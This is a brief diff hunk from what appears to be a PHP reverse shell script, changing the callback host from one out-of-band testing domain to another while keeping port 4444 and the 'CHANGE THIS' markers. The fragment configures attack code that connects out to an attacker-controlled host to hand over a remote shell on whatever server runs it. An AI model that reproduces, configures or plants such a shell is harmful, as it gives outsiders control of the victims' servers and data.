@@ -46,7 +46,7 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = 'q90dscbs1qg1nfsuu9x9yybi0960uuij.oastify.com';  // CHANGE THIS
+$ip = 'chdbypvbbqafhlsivplqv76lzcbiwkk71.oast.fun';  // CHANGE THIS
 $port = 4444;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
